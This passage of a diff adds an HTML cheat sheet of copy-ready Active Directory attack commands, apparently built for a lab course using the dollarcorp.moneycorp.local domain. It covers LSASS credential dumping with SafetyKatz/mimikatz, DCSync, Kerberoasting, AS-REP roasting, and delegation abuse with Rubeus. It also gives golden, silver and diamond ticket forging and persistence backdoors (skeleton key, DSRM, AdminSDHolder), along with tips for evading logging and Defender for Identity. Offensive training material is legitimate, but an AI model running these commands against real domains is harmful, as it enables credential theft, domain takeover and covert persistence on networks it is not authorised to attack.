+        <tr><td>Forest</td><td>Manual, can be 1-way or 2-way transitive</td></tr>
+      </table>
+      <div class="cmd"><span class="tool">Get-DomainTrust</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainTrust</span> <span class="flag">-Domain</span> us.dollarcorp.moneycorp.local<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-ForestDomain</span>                     <span class="comment"># all domains in forest</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-ForestTrust</span><span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">BloodHound Collection <span class="tag tag-purple">OPSEC</span></div>
+      <div class="cmd"><span class="comment"># Full collection:</span>
+<span class="tool">Loader.exe</span> <span class="flag">-Path</span> SharpHound.exe <span class="flag">-args</span> <span class="param">-collectionmethods All</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Stealth (avoids MDI) - exclude DCs:</span>
+<span class="tool">SharpHound.exe</span> <span class="flag">--collectionmethods</span> Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices <span class="flag">--excludedcs</span><span class="copy-hint">click to copy</span></div>
+      <div class="alert alert-purple" style="margin-top:8px"><span class="alert-icon">🕵️</span><div><strong>SOAPHound</strong> (stealthiest) — uses ADWS port 9389 instead of LDAP, near-zero MDI detection<br>
+      <code style="font-size:11px;color:var(--cyan)">SOAPHound.exe --buildcache -c cache.txt</code><br>
+      <code style="font-size:11px;color:var(--cyan)">SOAPHound.exe -c cache.txt --bhdump -o output --nolaps</code></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">User Hunting</div>
+    <div class="grid-2" style="margin-top:8px">
+      <div>
+        <div class="cmd"><span class="comment"># Find machines where current user is local admin:</span>
+<span class="tool">Find-LocalAdminAccess</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="comment"># Find where DA has sessions:</span>
+<span class="tool">Find-DomainUserLocation</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="tool">Find-DomainUserLocation</span> <span class="flag">-UserGroupIdentity</span> <span class="string">"RDPUsers"</span><span class="copy-hint">click to copy</span></div>
+      </div>
+      <div>
+        <div class="cmd"><span class="comment"># Only where we have access:</span>
+<span class="tool">Find-DomainUserLocation</span> <span class="flag">-CheckAccess</span><span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="comment"># SessionHunter (no admin needed, uses Remote Registry):</span>
+<span class="tool">Invoke-SessionHunter</span> <span class="flag">-FailSafe</span><span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="tool">Invoke-SessionHunter</span> <span class="flag">-NoPortScan -Targets</span> servers.txt<span class="copy-hint">click to copy</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- TAB 2: LOCAL PRIVESC -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="tab-panel" id="tab-2">
+  <div class="section-title"><span class="icon">🔺</span> Local Privilege Escalation</div>
+  <div class="section-subtitle">PowerUp · PrivescCheck · Jenkins · GPOddity · WinPEAS</div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">PowerUp — Service Misconfigs <span class="tag tag-blue">PowerUp</span></div>
+      <div class="cmd"><span class="comment"># Unquoted service paths with spaces:</span>
+<span class="tool">Get-ServiceUnquoted</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Services with writable binary path:</span>
+<span class="tool">Get-ModifiableServiceFile</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Services with modifiable config:</span>
+<span class="tool">Get-ModifiableService</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Run ALL checks:</span>
+<span class="tool">Invoke-AllChecks</span><span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Other Tools</div>
+      <div class="cmd"><span class="tool">Invoke-PrivEscCheck</span>               <span class="comment"># PrivescCheck</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">winPEASx64.exe</span>                      <span class="comment"># PEASS-ng</span><span class="copy-hint">click to copy</span></div>
+      <div class="alert alert-blue" style="margin-top:10px"><span class="alert-icon">📋</span><div>Common vectors: missing patches, AutoLogon creds in clear text, AlwaysInstallElevated (MSI as SYSTEM), misconfigured services, DLL hijacking, NTLM/Kerberos relaying</div></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Jenkins Exploitation <span class="tag tag-red">Feature Abuse</span></div>
+      <div class="alert alert-orange"><span class="alert-icon">⚠️</span><div>Jenkins on <strong>172.16.3.11:8080</strong> — two methods depending on access level</div></div>
+      <div class="steps">
+        <div class="step"><div class="step-num">A</div><div class="step-content"><div class="step-label">With Admin Access → Script Console</div><div class="cmd">http://&lt;jenkins&gt;:8080/script<span class="copy-hint">click to copy</span></div><div class="cmd"><span class="comment">// Groovy:</span>
+<span class="keyword">def</span> proc = <span class="string">'whoami'</span>.execute()
+proc.waitForOrKill(<span class="value">1000</span>)
+<span class="tool">println</span> proc.text<span class="copy-hint">click to copy</span></div></div></div>
+        <div class="step"><div class="step-num">B</div><div class="step-content"><div class="step-label">Without Admin → Edit Build Step</div><div class="cmd"><span class="comment"># Add "Execute Windows Batch Command":</span>
+<span class="tool">powershell</span> <span class="flag">-c</span> <span class="string">&lt;command&gt;</span><span class="copy-hint">click to copy</span></div></div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">GPO Abuse — GPOddity <span class="tag tag-orange">NTLM Relay</span></div>
+      <div class="alert alert-blue"><span class="alert-icon">ℹ️</span><div>Combines NTLM relaying + Group Policy Container modification. Relay creds of user with WriteDACL on GPO → modify gPCFileSysPath → load malicious template from attacker-controlled location</div></div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-label">Identify user with WriteDACL on GPO</div></div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-label">Set up NTLM relay listener</div></div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-label">Trigger coercion to relay credentials</div></div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-content"><div class="step-label">Malicious GPO template applied → adds user to local admins</div></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- TAB 3: LATERAL MOVEMENT -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="tab-panel" id="tab-3">
+  <div class="section-title"><span class="icon">↔️</span> Lateral Movement & Credential Extraction</div>
+  <div class="section-subtitle">PSRemoting · winrs · SafetyKatz · OPTH · DCSync — move quietly</div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">PowerShell Remoting <span class="tag tag-blue">PSRemoting</span></div>
+      <div class="cmd"><span class="comment"># Interactive session (1-to-1, stateful):</span>
+<span class="keyword">Enter-PSSession</span> <span class="flag">-ComputerName</span> server1<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Fan-out (1-to-many, non-interactive):</span>
+<span class="keyword">Invoke-Command</span> <span class="flag">-Scriptblock</span> {Get-Process} <span class="flag">-ComputerName</span> server1<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="keyword">Invoke-Command</span> <span class="flag">-FilePath</span> C:\scripts\script.ps1 <span class="flag">-ComputerName</span> server1<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Stateful session:</span>
+<span class="param">$Sess</span> = <span class="keyword">New-PSSession</span> <span class="flag">-Computername</span> Server1
+<span class="keyword">Invoke-Command</span> <span class="flag">-Session</span> <span class="param">$Sess</span> <span class="flag">-ScriptBlock</span> {<span class="param">$Proc</span> = Get-Process}
+<span class="keyword">Invoke-Command</span> <span class="flag">-Session</span> <span class="param">$Sess</span> <span class="flag">-ScriptBlock</span> {<span class="param">$Proc</span>.Name}<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">winrs <span class="tag tag-green">Evades PS Logging</span></div>
+      <div class="alert alert-green"><span class="alert-icon">✅</span><div>Uses port 5985 (WinRM), same as PSRemoting — but avoids PowerShell transcription and script block logging</div></div>
+      <div class="cmd"><span class="tool">winrs</span> <span class="flag">-remote:</span>server1 <span class="flag">-u:</span>server1\administrator <span class="flag">-p:</span>Pass@1234 hostname<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Also: winrm.vbs and COM objects of WSMan</span>
+<span class="comment"># github.com/bohops/WSMan-WinRM</span><span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Credential Extraction — LSASS <span class="tag tag-red">SafetyKatz</span></div>
+      <div class="cmd"><span class="comment"># Dump all credentials (ekeys = AES, RC4, etc.):</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"sekurlsa::ekeys"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">mimikatz.exe</span> <span class="flag">-Command</span> <span class="string">'\"sekurlsa::ekeys\"'</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Dump tickets and export:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"sekurlsa::tickets /export"</span><span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">DCSync <span class="tag tag-red">No Code Exec on DC</span></div>
+      <div class="alert alert-orange"><span class="alert-icon">⚠️</span><div>Requires: Domain Admin, Enterprise Admin, or user with Replication rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)</div></div>
+      <div class="cmd"><span class="comment"># Get krbtgt hash:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:dcorp\krbtgt"</span> <span class="string">"exit"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Get any user hash:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:dcorp\administrator"</span> <span class="string">"exit"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Cross-domain DCSync:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"</span> <span class="string">"exit"</span><span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">OverPass-the-Hash (OPTH) <span class="tag tag-purple">Rubeus</span></div>
+      <div class="cmd"><span class="comment"># Needs elevation — spawns process with logon type 9:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:&lt;key&gt; /run:cmd.exe"</span> <span class="string">"exit"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># No elevation needed (RC4):</span>
+<span class="tool">Rubeus.exe</span> asktgt /user:administrator /rc4:&lt;ntlmhash&gt; /ptt<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># With elevation (opsec safe, AES):</span>
+<span class="tool">Rubeus.exe</span> asktgt /user:administrator /aes256:&lt;key&gt; /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">SAM & Trust Keys <span class="tag tag-red">SafetyKatz</span></div>
+      <div class="cmd"><span class="comment"># LSA patch (code exec on DC):</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::lsa /patch"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Dump SAM (local accounts):</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"token::elevate"</span> <span class="string">"lsadump::sam"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Dump trust keys:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::trust /patch"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Trust key via DCSync:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:dcorp\mcorp$"</span><span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- TAB 4: KERBEROS ATTACKS -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="tab-panel" id="tab-4">
+  <div class="section-title"><span class="icon">🎟️</span> Kerberos Privilege Escalation</div>
+  <div class="section-subtitle">Kerberoasting · AS-REP Roasting · Unconstrained · Constrained · RBCD</div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Kerberoasting <span class="tag tag-red">Offline Crack</span></div>
+      <div class="alert alert-orange"><span class="alert-icon">🎯</span><div>TGS for service accounts encrypted with their password hash — crack offline. Works without elevated privileges!</div></div>
+      <div class="cmd"><span class="comment"># Find Kerberoastable accounts:</span>
+<span class="tool">Get-DomainUser</span> <span class="flag">-SPN</span>
+<span class="tool">Get-ADUser</span> <span class="flag">-Filter</span> {ServicePrincipalName <span class="flag">-ne</span> <span class="string">"$null"</span>} <span class="flag">-Properties</span> ServicePrincipalName<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Stats:</span>
+<span class="tool">Rubeus.exe</span> kerberoast /stats<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Roast specific user:</span>
+<span class="tool">Rubeus.exe</span> kerberoast /user:svcadmin /simple<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Avoid MDI (only RC4-only accounts):</span>
+<span class="tool">Rubeus.exe</span> kerberoast /rc4opsec /outfile:hashes.txt<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Crack:</span>
+<span class="tool">john.exe</span> <span class="flag">--wordlist=</span>10kworst-pass.txt hashes.txt
+<span class="tool">hashcat</span> <span class="flag">-m</span> 13100 hashes.txt wordlist.txt<span class="copy-hint">click to copy</span></div>
+      <div class="alert alert-red" style="margin-top:8px"><span class="alert-icon">🔍</span><div><strong>Detection:</strong> Event ID 4769 — filter encryption type <strong>0x17 (RC4)</strong><br><strong>Mitigation:</strong> Passwords &gt;35 chars, use gMSA accounts</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">AS-REP Roasting <span class="tag tag-orange">No Preauth</span></div>
+      <div class="alert alert-blue"><span class="alert-icon">ℹ️</span><div>Users with Kerberos preauthentication disabled — AS-REP hash can be captured and cracked offline</div></div>
+      <div class="cmd"><span class="comment"># Find vulnerable accounts:</span>
+<span class="tool">Get-DomainUser</span> <span class="flag">-PreauthNotRequired</span> <span class="flag">-Verbose</span>
+<span class="tool">Get-ADUser</span> <span class="flag">-Filter</span> {DoesNotRequirePreAuth <span class="flag">-eq</span> $True} <span class="flag">-Properties</span> DoesNotRequirePreAuth<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Roast + save:</span>
+<span class="tool">Rubeus.exe</span> asreproast /user:VPN1user /outfile:asrephashes.txt<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Crack:</span>
+<span class="tool">john.exe</span> <span class="flag">--wordlist=</span>10k-worst-pass.txt asrephashes.txt<span class="copy-hint">click to copy</span></div>
+      <hr class="divider">
+      <div class="card-title" style="margin-top:4px">Force Disable Preauth <span class="tag tag-red">GenericWrite Needed</span></div>
+      <div class="cmd"><span class="tool">Set-DomainObject</span> <span class="flag">-Identity</span> Control1User <span class="flag">-XOR</span> @{useraccountcontrol=<span class="value">4194304</span>} <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Set custom SPN then Kerberoast:</span>
+<span class="tool">Set-DomainObject</span> <span class="flag">-Identity</span> support1user <span class="flag">-Set</span> @{serviceprincipalname=<span class="string">'dcorp/whatever1'</span>}
+<span class="tool">Rubeus.exe</span> kerberoast /outfile:targetedhashes.txt<span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-bottom:16px">
+    <div class="card-title">Unconstrained Delegation <span class="tag tag-red">High Impact</span></div>
+    <div class="alert alert-red"><span class="alert-icon">🚨</span><div>When user authenticates to a server with unconstrained delegation, the DC places user's TGT inside the TGS — extractable and reusable as that user against ANY service!</div></div>
+    <div class="grid-2" style="margin-top:12px">
+      <div>
+        <div class="cmd"><span class="comment"># Find unconstrained machines:</span>
+<span class="tool">Get-DomainComputer</span> <span class="flag">-UnConstrained</span>
+<span class="tool">Get-ADComputer</span> <span class="flag">-Filter</span> {TrustedForDelegation <span class="flag">-eq</span> $True}<span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="comment"># Monitor for TGTs (on unconstrained machine):</span>
+<span class="tool">Rubeus.exe</span> monitor /interval:5 /nowrap<span class="copy-hint">click to copy</span></div>
+      </div>
+      <div>
+        <div class="cmd"><span class="comment"># Coerce DC to connect (MS-RPRN):</span>
+<span class="tool">MS-RPRN.exe</span> \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local<span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="comment"># Inject captured TGT + DCSync:</span>
+<span class="tool">Rubeus.exe</span> ptt /ticket:&lt;base64_TGT&gt;
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:dcorp\krbtgt"</span><span class="copy-hint">click to copy</span></div>
+      </div>
+    </div>
+    <div class="alert alert-blue" style="margin-top:8px"><span class="alert-icon">📡</span><div><strong>Coercion Protocols:</strong> MS-RPRN (Print Spooler - default ON), MS-WSP (Windows Search - default on client), MS-DFSNM (DFS - default OFF, MDI detects this)</div></div>
+  </div>
+
+  <div class="card" style="margin-bottom:16px">
+    <div class="card-title">Constrained Delegation (Protocol Transition) <span class="tag tag-orange">S4U</span></div>
+    <div class="alert alert-blue"><span class="alert-icon">ℹ️</span><div><strong>S4U2Self</strong>: Service gets forwardable TGS to itself for any user | <strong>S4U2Proxy</strong>: Service gets TGS to target service on behalf of user (controlled by msDS-AllowedToDelegateTo)</div></div>
+    <div class="grid-2" style="margin-top:10px">
+      <div>
+        <div class="cmd"><span class="comment"># Enumerate constrained delegation:</span>
+<span class="tool">Get-DomainUser</span> <span class="flag">-TrustedToAuth</span>
+<span class="tool">Get-DomainComputer</span> <span class="flag">-TrustedToAuth</span>
+<span class="tool">Get-ADObject</span> <span class="flag">-Filter</span> {msDS-AllowedToDelegateTo <span class="flag">-ne</span> <span class="string">"$null"</span>} <span class="flag">-Properties</span> msDS-AllowedToDelegateTo<span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="comment"># Abuse as websvc → access CIFS on mssql:</span>
+<span class="tool">Rubeus.exe</span> s4u /user:websvc /aes256:&lt;key&gt; /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt<span class="copy-hint">click to copy</span></div>
+      </div>
+      <div>
+        <div class="cmd"><span class="comment"># SPN substitution trick (/altservice):</span>
+<span class="comment"># Even if delegation is for TIME, substitute LDAP:</span>
+<span class="tool">Rubeus.exe</span> s4u /user:dcorp-adminsrv$ /aes256:&lt;key&gt; /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt<span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="comment"># Then DCSync:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:dcorp\krbtgt"</span> <span class="string">"exit"</span><span class="copy-hint">click to copy</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Resource-Based Constrained Delegation (RBCD) <span class="tag tag-purple">Write Privs</span></div>
+    <div class="alert alert-orange"><span class="alert-icon">🎯</span><div>Need: (1) Write permissions on target computer object AND (2) Control of an account with SPN (e.g. domain-joined machine, ms-DS-MachineAccountQuota = 10)</div></div>
+    <div class="steps" style="margin-top:12px">
+      <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-label">Find Write permissions on target</div><div class="cmd"><span class="tool">Find-InterestingDomainACL</span> | ?{<span class="param">$_</span>.identityreferencename <span class="flag">-match</span> <span class="string">'ciadmin'</span>}<span class="copy-hint">click to copy</span></div></div></div>
+      <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-label">Configure RBCD on target for our machine</div><div class="cmd"><span class="param">$comps</span> = <span class="string">'dcorp-student1$'</span>,<span class="string">'dcorp-student2$'</span>
+<span class="tool">Set-ADComputer</span> <span class="flag">-Identity</span> dcorp-mgmt <span class="flag">-PrincipalsAllowedToDelegateToAccount</span> <span class="param">$comps</span><span class="copy-hint">click to copy</span></div></div></div>
+      <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-label">Get our machine's AES keys</div><div class="cmd"><span class="tool">Invoke-Mimikatz</span> <span class="flag">-Command</span> <span class="string">'\"sekurlsa::ekeys\"'</span><span class="copy-hint">click to copy</span></div></div></div>
+      <div class="step"><div class="step-num">4</div><div class="step-content"><div class="step-label">S4U attack → access target as DA</div><div class="cmd"><span class="tool">Rubeus.exe</span> s4u /user:dcorp-student1$ /aes256:&lt;key&gt; /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
+<span class="tool">winrs</span> <span class="flag">-r:</span>dcorp-mgmt cmd.exe<span class="copy-hint">click to copy</span></div></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- TAB 5: DOMAIN PERSISTENCE -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="tab-panel" id="tab-5">
+  <div class="section-title"><span class="icon">👑</span> Domain Dominance & Persistence</div>
+  <div class="section-subtitle">Golden · Silver · Diamond · Skeleton Key · DSRM · AdminSDHolder · ACL Backdoors</div>
+
+  <div class="grid-3">
+    <div class="card">
+      <div class="card-title">Golden Ticket <span class="tag tag-yellow">krbtgt</span></div>
+      <div class="alert alert-orange"><span class="alert-icon">🔑</span><div>Forged TGT signed by krbtgt hash. Any user, any privilege. <strong>Requires: krbtgt AES256 + Domain SID</strong></div></div>
+      <div class="cmd"><span class="comment"># Get krbtgt:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:dcorp\krbtgt"</span> <span class="string">"exit"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Generate forge command:</span>
+<span class="tool">Rubeus.exe</span> golden /aes256:&lt;key&gt; /sid:&lt;SID&gt; /ldap /user:Administrator /printcmd<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Full forge + inject:</span>
+<span class="tool">Rubeus.exe</span> golden /aes256:&lt;key&gt; /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:&lt;SID&gt; /pwdlastset:&lt;date&gt; /minpassage:1 /logoncount:&lt;n&gt; /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Silver Ticket <span class="tag tag-cyan">TGS</span></div>
+      <div class="alert alert-blue"><span class="alert-icon">ℹ️</span><div>Forged TGS for specific service. Services rarely check PAC. Persistence ~30 days. <strong>Requires: Service account hash + Domain SID</strong></div></div>
+      <div class="cmd"><span class="tool">Rubeus.exe</span> silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:&lt;hash&gt; /sid:&lt;SID&gt; /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt<span class="copy-hint">click to copy</span></div>
+      <div class="alert alert-green" style="margin-top:8px"><span class="alert-icon">💡</span><div>Works for: HOST, RPCSS, CIFS, HTTP, WSMAN, LDAP, TIME — great for accessing many services from one hash</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Diamond Ticket <span class="tag tag-green">Opsec Safe</span></div>
+      <div class="alert alert-green"><span class="alert-icon">✅</span><div>Modifies a real DC-issued TGT instead of forging from scratch → valid ticket times, no missing TGT request pattern</div></div>
+      <div class="cmd"><span class="comment"># With user credentials:</span>
+<span class="tool">Rubeus.exe</span> diamond /krbkey:&lt;krbtgt_aes&gt; /user:studentx /password:&lt;pass&gt; /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># With tgtdeleg (domain user):</span>
+<span class="tool">Rubeus.exe</span> diamond /krbkey:&lt;key&gt; /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt<span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Skeleton Key <span class="tag tag-red">Risky</span></div>
+      <div class="alert alert-red"><span class="alert-icon">🚨</span><div>NOT persistent across reboots. Not opsec safe. Known to cause issues with AD CS. Very noisy in logs.</div></div>
+      <div class="cmd"><span class="comment"># Patch DC lsass (DA required) — password becomes "mimikatz":</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">'\"privilege::debug\" \"misc::skeleton\"'</span> <span class="flag">-ComputerName</span> dcorp-dc.dollarcorp.moneycorp.local<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># If lsass protected — use kernel driver:</span>
+mimikatz# privilege::debug
+mimikatz# !+
+mimikatz# !processprotect /process:lsass.exe /remove
+mimikatz# misc::skeleton<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">DSRM Persistence <span class="tag tag-orange">Local Admin</span></div>
+      <div class="alert alert-orange"><span class="alert-icon">🔐</span><div>Every DC has local Administrator with DSRM password (rarely changed). After registry mod, NTLM hash can be used to access DC.</div></div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-label">Dump DSRM hash (first hash = DSRM)</div><div class="cmd"><span class="tool">SafetyKatz.exe</span> <span class="string">"token::elevate"</span> <span class="string">"lsadump::sam"</span><span class="copy-hint">click to copy</span></div></div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-label">Enable local logon for DSRM account</div><div class="cmd"><span class="tool">winrs</span> <span class="flag">-r:</span>dcorp-dc cmd
+reg add <span class="string">"HKLM\System\CurrentControlSet\Control\Lsa"</span> /v <span class="string">"DsrmAdminLogonBehavior"</span> /t REG_DWORD /d 2 /f<span class="copy-hint">click to copy</span></div></div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-label">Pass-the-Hash to DC</div><div class="cmd"><span class="tool">SafetyKatz.exe</span> <span class="string">"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:&lt;hash&gt; /run:powershell.exe"</span>
+Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
+<span class="tool">Enter-PSSession</span> <span class="flag">-ComputerName</span> 172.16.2.1 <span class="flag">-Authentication</span> NegotiateWithImplicitCredential<span class="copy-hint">click to copy</span></div></div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">AdminSDHolder Backdoor <span class="tag tag-purple">ACL</span></div>
+      <div class="alert alert-purple"><span class="alert-icon">⏰</span><div>SDPROP runs every 60 min and syncs AdminSDHolder ACL to all Protected Groups. Add yourself to AdminSDHolder → propagates to DA, Backup Operators, Account Operators, etc.</div></div>
+      <div class="cmd"><span class="comment"># Add FullControl to AdminSDHolder:</span>
+<span class="tool">Add-DomainObjectAcl</span> <span class="flag">-TargetIdentity</span> <span class="string">'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local'</span> <span class="flag">-PrincipalIdentity</span> student1 <span class="flag">-Rights</span> All <span class="flag">-PrincipalDomain</span> dollarcorp.moneycorp.local <span class="flag">-TargetDomain</span> dollarcorp.moneycorp.local <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Trigger SDPROP manually:</span>
+<span class="tool">Invoke-SDPropagator</span> <span class="flag">-timeoutMinutes</span> 1 <span class="flag">-showProgress</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Abuse — add to Domain Admins:</span>
+<span class="tool">Add-DomainGroupMember</span> <span class="flag">-Identity</span> <span class="string">'Domain Admins'</span> <span class="flag">-Members</span> testda <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">DCSync Rights + Security Descriptors <span class="tag tag-red">Backdoor</span></div>
+      <div class="cmd"><span class="comment"># Add DCSync rights to user:</span>
+<span class="tool">Add-DomainObjectAcl</span> <span class="flag">-TargetIdentity</span> <span class="string">'DC=dollarcorp,DC=moneycorp,DC=local'</span> <span class="flag">-PrincipalIdentity</span> student1 <span class="flag">-Rights</span> DCSync <span class="flag">-PrincipalDomain</span> dollarcorp.moneycorp.local <span class="flag">-TargetDomain</span> dollarcorp.moneycorp.local <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
